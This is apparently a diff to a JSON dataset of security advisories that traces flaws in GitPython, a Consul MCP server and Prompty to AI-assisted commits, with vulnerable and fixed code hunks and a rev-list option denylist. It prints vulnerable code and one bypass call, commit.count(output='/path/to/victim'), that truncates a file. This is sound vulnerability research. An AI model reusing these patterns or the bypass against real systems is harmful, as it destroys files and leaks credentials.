+    "701ce32fe5ba8cb622c0e0342a376a6beb47d738"
+   ],
+   "carrier_set": [],
+   "minimum_fix_set": [
+    "38553b6fddc7f6a667cdb45a6762343a08fc72b2"
+   ],
+   "gates": {
+    "ai_hunk": "PASS",
+    "but_for": "PASS",
+    "fix_reversal": "PASS",
+    "identity": "PASS",
+    "release": "PASS",
+    "topology": "PASS",
+    "uniqueness": "PASS"
+   },
+   "vulnerable_release": {
+    "contains_candidate_ancestor": true,
+    "contains_fix_ancestor": false,
+    "kind": "git_tag",
+    "sha": "681c82c9c296f934635c81fa8294d4b6b6791b7e",
+    "tag": "3.1.55"
+   },
+   "fixed_release": {
+    "contains_fix_ancestor": true,
+    "kind": "git_tag",
+    "sha": "e3221f1252346259513e14afeed32f0a203512a7",
+    "tag": "3.1.56"
+   },
+   "published_at": "2026-08-03",
+   "severity": null,
+   "cwes": [],
+   "description": "The advisory covers a sink that the previous hardening pass left behind. That pass, first released in 3.1.51, closed command injection through archive, ls-remote and the revision APIs by giving those APIs an unsafe-option denylist and a shared check, and it added the rev-list denylist plus that check to the commit iterator. The counting method on the same commit object forwards its keyword arguments into the same rev-list command, but it was never given the check, so a caller-influenced options mapping such as an output path reached git and truncated that file to zero bytes before any revision was parsed.\n\nThe destroying write is a zero-byte truncation rather than content control, and the revision is the commit's own object id, so reachability is limited to a caller who controls the forwarded options; the impact is the integrity and availability of any file the process can write. The completing fix runs the same check in the counting method before the command is built and adds the same escape hatch, so the option now raises an error instead of reaching git.",
+   "references": [],
+   "mechanism": "The hardening change introduced the shared unsafe-option list for rev-list and the guard that consumes it, but it applied the guard inside iter_items only, and Commit.count kept forwarding its keyword arguments into the same command with no check at all, so an output option reached git and truncated the named file.",
+   "cause_category": "injection",
+   "ai_provenance": {
+    "family": "openai_gpt_codex",
+    "coverage": "complete",
+    "candidate_count": 1,
+    "named_candidate_count": 1
+   },
+   "fix_authorship": {
+    "classification": "ai_assisted",
+    "families": [
+     "openai_gpt_codex"
+    ],
+    "fixes": [
+     {
+      "sha": "38553b6fddc7f6a667cdb45a6762343a08fc72b2",
+      "classification": "ai_assisted",
+      "author": {
+       "name": "Sebastian Thiel",
+       "email": "sebastian.thiel@icloud.com"
+      }
+     }
+    ]
+   },
+   "code_evidence": {
+    "advisory_url": "https://github.com/advisories/ghsa-p538-c434-8v24",
+    "candidate_patch_sha256": "131ed16d93324d8aacfbe84609107ad0586efadba0d3060956531bc74fe41f6d",
+    "candidate_url": "https://github.com/gitpython-developers/gitpython/commit/701ce32fe5ba8cb622c0e0342a376a6beb47d738",
+    "display_hunks": [
+     {
+      "annotation": "The change records the rev-list options that can overwrite a file so the guard can enforce them wherever revision traversal happens.",
+      "code": "@@ -86,6 +86,12 @@ class Commit(base.Object, TraversableIterableObj, Diffable, Serializable):\n     # INVARIANTS\n     default_encoding = \"UTF-8\"\n \n+    # Options to :manpage:`git-rev-list(1)` that can overwrite files.\n+    unsafe_git_rev_options = [\n+        \"--output\",\n+        \"-o\",\n+    ]\n+\n     type: Literal[\"commit\"] = \"commit\"\n \n     __slots__ = (",
+      "file": "git/objects/commit.py",
+      "role": "candidate"
+     },
+     {
+      "annotation": "The traversal entry point gains the caller-facing escape hatch that the guarded sibling revision APIs already expose.",
+      "code": "@@ -302,6 +308,7 @@ class Commit(base.Object, TraversableIterableObj, Diffable, Serializable):\n         repo: \"Repo\",\n         rev: Union[str, \"Commit\", \"SymbolicReference\"],\n         paths: Union[PathLike, Sequence[PathLike]] = \"\",\n+        allow_unsafe_options: bool = False,\n         **kwargs: Any,\n     ) -> Iterator[\"Commit\"]:\n         R\"\"\"Find all commits matching the given criteria.",
+      "file": "git/objects/commit.py",
+      "role": "candidate"
+     },
+     {
+      "annotation": "Only the iterator that walks commits receives the new check, while the counting path that forwards the same options stays unchecked.",
+      "code": "@@ -330,6 +337,11 @@ class Commit(base.Object, TraversableIterableObj, Diffable, Serializable):\n             raise ValueError(\"--pretty cannot be used as parsing expects single sha's only\")\n         # END handle pretty\n \n+        if not allow_unsafe_options:\n+            Git.check_unsafe_options(\n+                options=Git._option_candidates([rev], kwargs), unsafe_options=cls.unsafe_git_rev_options\n+            )\n+\n         # Use -- in all cases, to prevent possibility of ambiguous arguments.\n         # See https://github.com/gitpython-developers/GitPython/issues/264.\n ",
+      "file": "git/objects/commit.py",
+      "role": "candidate"
+     },
+     {
+      "annotation": "The counting method now accepts the same escape hatch parameter as the guarded traversal API.",
+      "code": "@@ -269,13 +269,21 @@ class Commit(base.Object, TraversableIterableObj, Diffable, Serializable):\n         else:\n             return self.message.split(b\"\\n\", 1)[0]\n \n-    def count(self, paths: Union[PathLike, Sequence[PathLike]] = \"\", **kwargs: Any) -> int:\n+    def count(\n+        self,\n+        paths: Union[PathLike, Sequence[PathLike]] = \"\",\n+        allow_unsafe_options: bool = False,\n+        **kwargs: Any,\n+    ) -> int:\n         \"\"\"Count the number of commits reachable from this commit.\n \n         :param paths:\n             An optional path or a list of paths restricting the return value to commits\n             actually containing the paths.\n \n+        :param allow_unsafe_options:\n+            Allow unsafe options, like ``--output``.\n+\n         :param kwargs:\n             Additional options to be passed to :manpage:`git-rev-list(1)`. They must not\n             alter the output style of the command, or parsing will yield incorrect",
+      "file": "git/objects/commit.py",
+      "role": "fix"
+     },
+     {
+      "annotation": "An output option passed to the counting method now raises an error instead of letting git truncate the named file.",
+      "code": "@@ -284,6 +292,11 @@ class Commit(base.Object, TraversableIterableObj, Diffable, Serializable):\n         :return:\n             An int defining the number of reachable commits\n         \"\"\"\n+        if not allow_unsafe_options:\n+            Git.check_unsafe_options(\n+                options=Git._option_candidates([], kwargs), unsafe_options=self.unsafe_git_rev_options\n+            )\n+\n         # Yes, it makes a difference whether empty paths are given or not in our case as\n         # the empty paths version will ignore merge commits for some reason.\n         if paths:",
+      "file": "git/objects/commit.py",
+      "role": "fix"
+     }
+    ],
+    "fix_marker": "Co-authored-by: GPT 5.6 <codex@openai.com>",
+    "fix_patch_sha256": "fbced19654af1d40f13fc4d56d34be277113a27da1f677daa0f4d10a987e6fda",
+    "fix_url": "https://github.com/gitpython-developers/gitpython/commit/38553b6fddc7f6a667cdb45a6762343a08fc72b2",
+    "steps": [
+     {
+      "detail": "The hardening pass that closed command injection through archive, ls-remote and the revision APIs added a rev-list denylist and enforced it inside the commit iterator, leaving the counting method that forwards the same keyword arguments unchecked.",
+      "title": "AI change"
+     },
+     {
+      "detail": "The completing change runs the same unsafe-option check inside the counting method and adds the matching escape hatch, so an output option now raises an error instead of truncating the named file.",
+      "title": "Fix"
+     }
+    ],
+    "summary": "An AI-assisted change added option screening for revision traversal but wired it only into the iterator that walks commits, so the counting method on the same commit kept forwarding a file-overwriting option to git and could blank any file the caller named."
+   },
+   "ir_chain": {
+    "original_advisory_ids": [
+     "GHSA-956x-8gvw-wg5v"
+    ],
+    "original_mechanism": "The AI-authored guard for the git option-injection family added the rev-list denylist (--output, -o), the allow_unsafe_options parameter and the check_unsafe_options call to Commit.iter_items only, so the same caller-supplied options stayed free to reach git rev-list through the sibling method Commit.count.",
+    "original_sink": "Commit.count() in git/objects/commit.py, which forwards **kwargs into rev_list and so into git rev-list --output=<path>",
+    "original_author_kind": "AI",
+    "original_author_name": "GPT 5.6",
+    "original_sha": "701ce32fe5ba8cb622c0e0342a376a6beb47d738",
+    "unresolved_reason": null,
+    "attempted_remediation": {
+     "candidate_shas": [
+      "701ce32fe5ba8cb622c0e0342a376a6beb47d738"
+     ],
+     "changed": "Added unsafe_git_rev_options with --output and -o, the allow_unsafe_options parameter and the check_unsafe_options call inside Commit.iter_items, as part of the same four-file hardening pass that guarded Repo.archive and git.ls_remote.",
+     "missed": "Commit.count kept forwarding the same options to rev_list without consulting the denylist, so the guard covered the method named in the report instead of the option surface the two methods share."
+    },
+    "residual_bypass": "commit.count(output='/path/to/victim') still reached git rev-list --output and truncated the target file to 0 bytes in every release from 3.1.51 through 3.1.55, because only iter_items consulted the denylist.",
+    "final_closure": {
+     "closed": "Commit.count gains the allow_unsafe_options escape hatch and the check_unsafe_options call, so the rev-list invocation refuses output and the other denied options before the command is built; released in 3.1.56 with a regression test in test/test_commit.py.",
+     "minimum_fix_shas": [
+      "38553b6fddc7f6a667cdb45a6762343a08fc72b2"
+     ]
+    }
+   },
+   "unpatched": null,
+   "advisory_url": "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-5XXX-QHH7-9287",
+   "publication_issues": [],
+   "publication_status": "confirmed"
+  },
+  {
    "case_id": "GHSA-539M-9XH6-Q6RR",
    "aliases": [],
    "repository": "gitpython-developers/gitpython",
@@ -6986,6 +6796,122 @@
    "ir_chain": null,
    "unpatched": null,
    "advisory_url": "https://github.com/advisories/ghsa-6c5r-pj95-xvqv",
+   "publication_issues": [],
+   "publication_status": "confirmed"
+  },
+  {
+   "case_id": "GHSA-5H6C-295F-7PP3",
+   "aliases": [
+    "CVE-2026-16328"
+   ],
+   "repository": "hashicorp/consul-mcp-server",
+   "repository_metadata": {
+    "full_name": "hashicorp/consul-mcp-server",
+    "language": "Go",
+    "archived": false
+   },
+   "contribution_class": "AI_DIRECT_ROOT",
+   "candidate_set": [
+    "b1cd635f74e2fecc93537ce78aebf3fe2d37d03f"
+   ],
+   "carrier_set": [],
+   "minimum_fix_set": [
+    "af8a9df316f2d001f9f570b7f1327367e4642b11"
+   ],
+   "gates": {
+    "ai_hunk": "PASS",
+    "but_for": "PASS",
+    "fix_reversal": "PASS",
+    "identity": "PASS",
+    "release": "PASS",
+    "topology": "PASS",
+    "uniqueness": "PASS"
+   },
+   "vulnerable_release": {
+    "contains_candidate_ancestor": true,
+    "contains_fix_ancestor": false,
+    "kind": "git_tag",
+    "sha": "be9b583aac9d53d4f9e14009348dc566c6d38818",
+    "tag": "v0.1.1"
+   },
+   "fixed_release": {
+    "contains_fix_ancestor": true,
+    "kind": "git_tag",
+    "sha": "cfc1e4c47dcd5c7a092bddcd1ac2682774906320",
+    "tag": "v0.1.4"
+   },
+   "published_at": "2026-07-29",
+   "severity": null,
+   "cwes": [],
+   "description": "The server bridges MCP clients to a Consul cluster and is deployed with one Consul endpoint and one Consul token. The request path let the client choose that endpoint: a header put an address into the request context, and the client builder replaced the configured address with it, so the server's own credentials stayed attached to the redirected call. Anyone able to reach the server could send its Consul API traffic to a host they controlled and observe the Consul token travelling with it. The hardening change removes the header read and the context override and keeps the Consul address on the server's CONSUL_HTTP_ADDR setting, which closes the redirect.",
+   "references": [],
+   "mechanism": "The request middleware copied an X-Consul-Address header into the request context, and the client builder used that value as the Consul address for every API call made while handling the request. A client could therefore redirect the server's Consul traffic to an endpoint it controlled and read the configured Consul token from the outgoing request the server sent there.",
+   "cause_category": "other_ambiguous",
+   "ai_provenance": {
+    "family": "copilot",
+    "coverage": "complete",
+    "candidate_count": 1,
+    "named_candidate_count": 1
+   },
+   "fix_authorship": {
+    "classification": "no_ai_marker",
+    "families": [],
+    "fixes": [
+     {
+      "sha": "af8a9df316f2d001f9f570b7f1327367e4642b11",
+      "classification": "no_ai_marker",
+      "author": {
+       "name": "Sanika Chavan",
+       "email": "Sanika.Chavan@ibm.com"
+      }
+     }
+    ]
+   },
+   "code_evidence": {
+    "advisory_url": "https://github.com/advisories/ghsa-5h6c-295f-7pp3",
+    "candidate_url": "https://github.com/hashicorp/consul-mcp-server/commit/b1cd635f74e2fecc93537ce78aebf3fe2d37d03f",
+    "display_hunks": [
+     {
+      "annotation": "The middleware takes the address from the X-Consul-Address header and puts it in the request context for the client builder.",
+      "code": "@@ -0,0 +141,6 @@\n+\t\t\t// Extract Consul address from header\n+\t\t\tconsulAddr := r.Header.Get(textproto.CanonicalMIMEHeaderKey(\"X-Consul-Address\"))\n+\t\t\tif consulAddr != \"\" {\n+\t\t\t\tctx = context.WithValue(ctx, \"consul_address\", consulAddr)\n+\t\t\t\tlogger.Debugf(\"consul_address: %s\", consulAddr)\n+\t\t\t}",
+      "file": "pkg/client/middleware.go",
+      "role": "candidate"
+     },
+     {
+      "annotation": "The client builder replaces the configured Consul address with the value it finds in the request context.",
+      "code": "@@ -0,0 +65,6 @@\n+\t// override the address and token from session context if available\n+\tif addr, ok := ctx.Value(\"consul_address\").(string); ok && addr != \"\" {\n+\t\taddress = addr\n+\t}\n+\n+\tif tkn, ok := ctx.Value(\"consul_token\").(string); ok && tkn != \"\" {",
+      "file": "pkg/client/consul_client.go",
+      "role": "candidate"
+     },
+     {
+      "annotation": "The fix deletes the header read, so a request can no longer place an address in the context.",
+      "code": "@@ -141,5 +138,1 @@ func NewSecurityHandler(handler http.Handler, allowedOrigins []string, corsMode\n-\t\t\t// Extract Consul address from header\n-\t\t\tconsulAddr := r.Header.Get(textproto.CanonicalMIMEHeaderKey(\"X-Consul-Address\"))\n-\t\t\tif consulAddr != \"\" {\n-\t\t\t\tctx = context.WithValue(ctx, \"consul_address\", consulAddr)\n-\t\t\t\tlogger.Debugf(\"consul_address: %s\", consulAddr)\n+\t\t\tsessionID := r.Header.Get(server.HeaderKeySessionID)",
+      "file": "pkg/client/middleware.go",
+      "role": "fix"
+     },
+     {
+      "annotation": "The fix drops the context override and records that the Consul address now comes only from the server's configuration; only the token still comes from the request.",
+      "code": "@@ -67,6 +72,2 @@ func NewConsulClient(ctx context.Context, sessionId string, logger *log.Logger)\n-\t// override the address and token from session context if available\n-\tif addr, ok := ctx.Value(\"consul_address\").(string); ok && addr != \"\" {\n-\t\taddress = addr\n-\t}\n-\n-\tif tkn, ok := ctx.Value(\"consul_token\").(string); ok && tkn != \"\" {\n+\t// Override the token from request context if available. The Consul address\n+\t// is intentionally only read from CONSUL_HTTP_ADDR.",
+      "file": "pkg/client/consul_client.go",
+      "role": "fix"
+     }
+    ],
+    "fix_url": "https://github.com/hashicorp/consul-mcp-server/commit/af8a9df316f2d001f9f570b7f1327367e4642b11",
+    "steps": [
+     {
+      "detail": "The initial server implementation read an address from the X-Consul-Address request header and stored it in the request context for the client builder to apply to the Consul endpoint.",
+      "title": "AI change"
+     },
+     {
+      "detail": "The client hardening change deletes the header read and the context override, so the Consul endpoint comes only from the server's own CONSUL_HTTP_ADDR configuration.",
+      "title": "Fix"
+     }
+    ],
+    "summary": "An AI-assisted change let a connecting client pick the Consul API address with a request header, so the server could be pointed at an attacker-controlled endpoint and send along the Consul token it was configured with."
+   },
+   "ir_chain": null,
+   "unpatched": null,
+   "advisory_url": "https://github.com/advisories/ghsa-5h6c-295f-7pp3",
    "publication_issues": [],
    "publication_status": "confirmed"
   },
@@ -7857,7 +7783,7 @@
     "language": "Rust",
     "archived": false
    },
-   "contribution_class": "AI_DIRECT_ROOT",
+   "contribution_class": "AI_NEW_SURFACE_CONTRIBUTOR",
    "candidate_set": [
     "a0e6108842a3bfc840a33db819a4415fbdac333d"
    ],
@@ -7866,23 +7792,25 @@
     "e4a0ebf49e3a78d5d7796c8480bf9a4f0c54d19e"
    ],
    "gates": {
-    "identity": "PASS",
     "ai_hunk": "PASS",
-    "topology": "PASS",
     "but_for": "PASS",
     "fix_reversal": "PASS",
+    "identity": "PASS",
     "release": "PASS",
+    "topology": "PASS",
     "uniqueness": "PASS"
    },
    "vulnerable_release": {
     "kind": "git_tag",
     "sha": "38fd5f31368824222a8dc226540f0d8a79a20771",
-    "tag": "typescript/2.0.0-beta.1"
+    "tag": "typescript/2.0.0-beta.1",
+    "version": "2.0.0-beta.1"
    },
    "fixed_release": {
     "kind": "git_tag",
     "sha": "d8891f66b93bfa37f0611186258c953e12e87fd3",
-    "tag": "typescript/2.0.0-beta.5"
+    "tag": "typescript/2.0.0-beta.5",
+    "version": "2.0.0-beta.5"
    },
    "published_at": "2026-07-24",
    "severity": "CRITICAL",
@@ -7900,7 +7828,7 @@
    "mechanism": "The Copilot-coauthored TypeScript v2 runtime created an unrestricted Nunjucks Environment and rendered attacker-controlled templates with host objects. The fix blocks constructor/prototype traversal, function calls, and non-own input data. The advisory has no CVE.",
    "cause_category": "injection",
    "ai_provenance": {
-    "family": "claude",
+    "family": "copilot",
     "coverage": "complete",
     "candidate_count": 1,
     "named_candidate_count": 1
@@ -7908,91 +7836,62 @@
    "fix_authorship": {
     "classification": "ai_assisted",
     "families": [
-     "github_copilot"
+     "copilot"
     ],
     "fixes": [
      {
-      "author": {
-       "email": "me@sethjuarez.com",
-       "name": "Seth Juarez"
-      },
-      "authored_at": "2026-07-20T10:38:47-07:00",
+      "sha": "e4a0ebf49e3a78d5d7796c8480bf9a4f0c54d19e",
       "classification": "ai_assisted",
-      "evidence": [
-       {
-        "family": "github_copilot",
-        "kind": "coauthor_trailer",
-        "text": "Co-authored-by: Copilot App <223556219+Copilot@users.noreply.github.com>"
-       }
-      ],
-      "families": [
-       "github_copilot"
-      ],
-      "sha": "e4a0ebf49e3a78d5d7796c8480bf9a4f0c54d19e"
+      "author": {
+       "name": "Seth Juarez",
+       "email": "me@sethjuarez.com"
+      }
      }
     ]
    },
    "code_evidence": {
-    "fix_marker": "Co-authored-by: Copilot App <223556219+Copilot@users.noreply.github.com>",
-    "candidate_url": "https://github.com/microsoft/prompty/commit/a0e6108842a3bfc840a33db819a4415fbdac333d",
-    "fix_url": "https://github.com/microsoft/prompty/commit/e4a0ebf49e3a78d5d7796c8480bf9a4f0c54d19e",
     "advisory_url": "https://github.com/microsoft/prompty/security/advisories/GHSA-w28w-gp39-m4p6",
-    "summary": "Copilot-assisted TypeScript code rendered attacker-controlled Nunjucks templates with host objects and unrestricted JavaScript member access. The direct fix blocks prototype traversal and function calls and exposes only copied own data.",
-    "mechanism": "NunjucksRenderer passed prepared inputs directly to an unrestricted Nunjucks Environment. Templates could follow constructor or prototype properties and call host functions; the fix sanitizes inputs, limits lookup to own data properties, and disables calls during rendering.",
-    "steps": [
-     {
-      "title": "AI change",
-      "detail": "The new TypeScript renderer created a default Nunjucks runtime and rendered templates against prepared host values without a sandbox boundary."
-     },
-     {
-      "title": "Security fix",
-      "detail": "The direct PR member copies only safe own data, rejects constructor and prototype access, blocks calls, and routes the real sink through those guards."
-     }
-    ],
-    "candidate_patch_sha256": "6053a07104b64c2f032ecb0b30f19d83e258a087861ac41e91817032fb76a18d",
-    "fix_patch_sha256": "61f2622257aa8beb39bee219cd58dd68a77a4ac93b7ead24b70df5cd8d05ad4c",
     "candidate_patch_files": [
      "runtime/typescript/prompty/src/renderers/nunjucks.ts"
     ],
-    "fix_patch_files": [
-     "runtime/typescript/packages/core/src/renderers/nunjucks.ts"
+    "candidate_patch_sha256": "6053a07104b64c2f032ecb0b30f19d83e258a087861ac41e91817032fb76a18d",
+    "candidate_url": "https://github.com/microsoft/prompty/commit/a0e6108842a3bfc840a33db819a4415fbdac333d",
+    "display_hunks": [
+     {
+      "annotation": "The Copilot-coauthored TypeScript runtime created a plain Nunjucks environment and sent prepared host values directly to renderString. Attacker-controlled templates could traverse constructor and prototype properties and invoke functions in the host Node.js process.",
+      "code": "@@ -0,0 +1,30 @@\n+/**\n+ * Nunjucks renderer — Jinja2-compatible template rendering for TypeScript.\n+ *\n+ * Nunjucks is the standard Jinja2-compatible engine for Node.js.\n+ * This renderer replaces thread-kind inputs with nonce markers\n+ * before rendering.\n+ *\n+ * @module\n+ */\n+\n+import nunjucks from \"nunjucks\";\n+import type { PromptAgent } from \"agentschema\";\n+import type { Renderer } from \"../core/interfaces.js\";\n+import { prepareRenderInputs } from \"./common.js\";\n+\n+const env = new nunjucks.Environment(null, {\n+  autoescape: false,\n+  throwOnUndefined: false,\n+});\n+\n+export class NunjucksRenderer implements Renderer {\n+  async render(\n+    agent: PromptAgent,\n+    template: string,\n+    inputs: Record<string, unknown>,\n+  ): Promise<string> {\n+    const [modified] = prepareRenderInputs(agent, inputs);\n+    return env.renderString(template, modified);\n+  }\n+}",
+      "file": "runtime/typescript/prompty/src/renderers/nunjucks.ts",
+      "role": "candidate"
+     },
+     {
+      "annotation": "The fix replaces unrestricted JavaScript object traversal with own-data-only lookup, strips unsafe constructor and prototype keys from inputs, and blocks every template function call while Nunjucks renders. Restoring the original runtime hooks in finally confines those guards to this render operation.",
+      "code": "@@ -13,11 +13,91 @@ import type { Prompty } from \"../model/agent/prompty.js\";\n import type { Renderer } from \"../core/interfaces.js\";\n import { prepareRenderInputs } from \"./common.js\";\n \n+type NunjucksRuntime = {\n+  memberLookup: (object: unknown, property: unknown) => unknown;\n+  callWrap: (callable: unknown, name: string, context: unknown, args: unknown[]) => unknown;\n+};\n+\n+const UNSAFE_PROPERTIES = new Set([\"__proto__\", \"constructor\", \"prototype\"]);\n+\n const env = new nunjucks.Environment(null, {\n   autoescape: false,\n   throwOnUndefined: false,\n });\n \n+function safeMemberLookup(object: unknown, property: unknown): unknown {\n+  if (typeof property === \"string\" && UNSAFE_PROPERTIES.has(property)) {\n+    throw new Error(`Unsafe template member access: ${property}`);\n+  }\n+\n+  if (\n+    (typeof property !== \"string\" && typeof property !== \"number\") ||\n+    object === null ||\n+    typeof object !== \"object\"\n+  ) {\n+    return undefined;\n+  }\n+\n+  const descriptor = Object.getOwnPropertyDescriptor(object, property);\n+  return descriptor !== undefined && \"value\" in descriptor ? descriptor.value : undefined;\n+}\n+\n+function safeCallWrap(_callable: unknown, name: string, _context: unknown, _args: unknown[]): never {\n+  throw new Error(`Template function calls are not allowed: ${name}`);\n+}\n+\n+function sanitizeValue(value: unknown, seen = new WeakMap<object, unknown>()): unknown {\n+  if (value === null || typeof value === \"string\" || typeof value === \"number\" || typeof value === \"boolean\") {\n+    return value;\n+  }\n+\n+  if (typeof value !== \"object\") {\n+    return undefined;\n+  }\n+\n+  const existing = seen.get(value);\n+  if (existing !== undefined) {\n+    return existing;\n+  }\n+\n+  if (Array.isArray(value)) {\n+    const result: unknown[] = [];\n+    seen.set(value, result);\n+    for (const item of value) {\n+      result.push(sanitizeValue(item, seen));\n+    }\n+    return result;\n+  }\n+\n+  const result = Object.create(null) as Record<string, unknown>;\n+  seen.set(value, result);\n+  for (const [key, descriptor] of Object.entries(Object.getOwnPropertyDescriptors(value))) {\n+    if (!UNSAFE_PROPERTIES.has(key) && \"value\" in descriptor) {\n+      result[key] = sanitizeValue(descriptor.value, seen);\n+    }\n+  }\n+  return result;\n+}\n+\n+function sanitizeInputs(inputs: Record<string, unknown>): Record<string, unknown> {\n+  return sanitizeValue(inputs) as Record<string, unknown>;\n+}\n+\n+function renderSafely(template: string, inputs: Record<string, unknown>): string {\n+  const runtime = nunjucks.runtime as unknown as NunjucksRuntime;\n+  const memberLookup = runtime.memberLookup;\n+  const callWrap = runtime.callWrap;\n+  runtime.memberLookup = safeMemberLookup;\n+  runtime.callWrap = safeCallWrap;\n+\n+  try {\n+    return env.renderString(template, inputs);\n+  } finally {\n+    runtime.memberLookup = memberLookup;\n+    runtime.callWrap = callWrap;\n+  }\n+}\n+\n export class NunjucksRenderer implements Renderer {\n   async render(\n     agent: Prompty,",
+      "file": "runtime/typescript/packages/core/src/renderers/nunjucks.ts",
+      "role": "fix"
+     },
+     {
+      "annotation": "The vulnerable sink previously passed prepared host values straight to the unrestricted environment. This call-site replacement makes both input sanitization and the guarded Nunjucks runtime mandatory on the actual render path.",
+      "code": "@@ -25,6 +105,6 @@ export class NunjucksRenderer implements Renderer {\n     inputs: Record<string, unknown>,\n   ): Promise<string> {\n     const [modified] = prepareRenderInputs(agent, inputs);\n-    return env.renderString(template, modified);\n+    return renderSafely(template, sanitizeInputs(modified));\n   }\n }",
+      "file": "runtime/typescript/packages/core/src/renderers/nunjucks.ts",
+      "role": "fix"
+     }
     ],
     "fix_files": [
      "runtime/typescript/packages/core/src/renderers/nunjucks.ts"
     ],
-    "annotation_mode": "hunk_specific",
-    "required_anchors": {
-     "candidate": [
-      "new nunjucks.Environment",
-      "env.renderString(template, modified)"
-     ],
-     "fix": [
-      "UNSAFE_PROPERTIES",
-      "Object.getOwnPropertyDescriptor",
-      "runtime.callWrap = safeCallWrap",
-      "renderSafely(template, sanitizeInputs(modified))"
-     ]
-    },
-    "display_hunks": [
+    "fix_patch_sha256": "12d3e783e751cca86313a05b4f8fcc4c5a18f8e928453276da4bd0b64b44e233",
+    "fix_url": "https://github.com/microsoft/prompty/commit/e4a0ebf49e3a78d5d7796c8480bf9a4f0c54d19e",
+    "steps": [
      {
-      "file": "runtime/typescript/prompty/src/renderers/nunjucks.ts",
-      "code": "@@ -0,0 +1,30 @@\n+/**\n+ * Nunjucks renderer — Jinja2-compatible template rendering for TypeScript.\n+ *\n+ * Nunjucks is the standard Jinja2-compatible engine for Node.js.\n+ * This renderer replaces thread-kind inputs with nonce markers\n+ * before rendering.\n+ *\n+ * @module\n+ */\n+\n+import nunjucks from \"nunjucks\";\n+import type { PromptAgent } from \"agentschema\";\n+import type { Renderer } from \"../core/interfaces.js\";\n+import { prepareRenderInputs } from \"./common.js\";\n+\n+const env = new nunjucks.Environment(null, {\n+  autoescape: false,\n+  throwOnUndefined: false,\n+});\n+\n+export class NunjucksRenderer implements Renderer {\n+  async render(\n+    agent: PromptAgent,\n+    template: string,\n+    inputs: Record<string, unknown>,\n+  ): Promise<string> {\n+    const [modified] = prepareRenderInputs(agent, inputs);\n+    return env.renderString(template, modified);\n+  }\n+}",
-      "annotation": "The Copilot-coauthored TypeScript runtime created a plain Nunjucks environment and sent prepared host values directly to renderString. Attacker-controlled templates could traverse constructor and prototype properties and invoke functions in the host Node.js process.",
-      "role": "candidate"
+      "detail": "The new TypeScript renderer created a default Nunjucks runtime and rendered templates against prepared host values without a sandbox boundary.",
+      "title": "AI change"
      },
      {
-      "file": "runtime/typescript/packages/core/src/renderers/nunjucks.ts",
-      "role": "fix",
-      "code": "@@ -13,11 +13,91 @@ import type { Prompty } from \"../model/agent/prompty.js\";\n import type { Renderer } from \"../core/interfaces.js\";\n import { prepareRenderInputs } from \"./common.js\";\n \n+type NunjucksRuntime = {\n+  memberLookup: (object: unknown, property: unknown) => unknown;\n+  callWrap: (callable: unknown, name: string, context: unknown, args: unknown[]) => unknown;\n+};\n+\n+const UNSAFE_PROPERTIES = new Set([\"__proto__\", \"constructor\", \"prototype\"]);\n+\n const env = new nunjucks.Environment(null, {\n   autoescape: false,\n   throwOnUndefined: false,\n });\n \n+function safeMemberLookup(object: unknown, property: unknown): unknown {\n+  if (typeof property === \"string\" && UNSAFE_PROPERTIES.has(property)) {\n+    throw new Error(`Unsafe template member access: ${property}`);\n+  }\n+\n+  if (\n+    (typeof property !== \"string\" && typeof property !== \"number\") ||\n+    object === null ||\n+    typeof object !== \"object\"\n+  ) {\n+    return undefined;\n+  }\n+\n+  const descriptor = Object.getOwnPropertyDescriptor(object, property);\n+  return descriptor !== undefined && \"value\" in descriptor ? descriptor.value : undefined;\n+}\n+\n+function safeCallWrap(_callable: unknown, name: string, _context: unknown, _args: unknown[]): never {\n+  throw new Error(`Template function calls are not allowed: ${name}`);\n+}\n+\n+function sanitizeValue(value: unknown, seen = new WeakMap<object, unknown>()): unknown {\n+  if (value === null || typeof value === \"string\" || typeof value === \"number\" || typeof value === \"boolean\") {\n+    return value;\n+  }\n+\n+  if (typeof value !== \"object\") {\n+    return undefined;\n+  }\n+\n+  const existing = seen.get(value);\n+  if (existing !== undefined) {\n+    return existing;\n+  }\n+\n+  if (Array.isArray(value)) {\n+    const result: unknown[] = [];\n+    seen.set(value, result);\n+    for (const item of value) {\n+      result.push(sanitizeValue(item, seen));\n+    }\n+    return result;\n+  }\n+\n+  const result = Object.create(null) as Record<string, unknown>;\n+  seen.set(value, result);\n+  for (const [key, descriptor] of Object.entries(Object.getOwnPropertyDescriptors(value))) {\n+    if (!UNSAFE_PROPERTIES.has(key) && \"value\" in descriptor) {\n+      result[key] = sanitizeValue(descriptor.value, seen);\n+    }\n+  }\n+  return result;\n+}\n+\n+function sanitizeInputs(inputs: Record<string, unknown>): Record<string, unknown> {\n+  return sanitizeValue(inputs) as Record<string, unknown>;\n+}\n+\n+function renderSafely(template: string, inputs: Record<string, unknown>): string {\n+  const runtime = nunjucks.runtime as unknown as NunjucksRuntime;\n+  const memberLookup = runtime.memberLookup;\n+  const callWrap = runtime.callWrap;\n+  runtime.memberLookup = safeMemberLookup;\n+  runtime.callWrap = safeCallWrap;\n+\n+  try {\n+    return env.renderString(template, inputs);\n+  } finally {\n+    runtime.memberLookup = memberLookup;\n+    runtime.callWrap = callWrap;\n+  }\n+}\n+\n export class NunjucksRenderer implements Renderer {\n   async render(\n     agent: Prompty,",
-      "annotation": "The fix replaces unrestricted JavaScript object traversal with own-data-only lookup, strips unsafe constructor and prototype keys from inputs, and blocks every template function call while Nunjucks renders. Restoring the original runtime hooks in finally confines those guards to this render operation."
-     },
-     {
-      "file": "runtime/typescript/packages/core/src/renderers/nunjucks.ts",
-      "role": "fix",
-      "code": "@@ -25,6 +105,6 @@ export class NunjucksRenderer implements Renderer {\n     inputs: Record<string, unknown>,\n   ): Promise<string> {\n     const [modified] = prepareRenderInputs(agent, inputs);\n-    return env.renderString(template, modified);\n+    return renderSafely(template, sanitizeInputs(modified));\n   }\n }",
-      "annotation": "The vulnerable sink previously passed prepared host values straight to the unrestricted environment. This call-site replacement makes both input sanitization and the guarded Nunjucks runtime mandatory on the actual render path."
+      "detail": "The direct PR member copies only safe own data, rejects constructor and prototype access, blocks calls, and routes the real sink through those guards.",
+      "title": "Security fix"
      }
-    ]
+    ],
+    "summary": "Copilot-assisted TypeScript code rendered attacker-controlled Nunjucks templates with host objects and unrestricted JavaScript member access. The direct fix blocks prototype traversal and function calls and exposes only copied own data."
    },
    "ir_chain": null,
    "unpatched": null,
@@ -8656,6 +8555,148 @@
    },
    "unpatched": null,
    "advisory_url": "https://github.com/advisories/ghsa-frvj-c5qp-xj4w",
+   "publication_issues": [],
+   "publication_status": "confirmed"
+  },
+  {
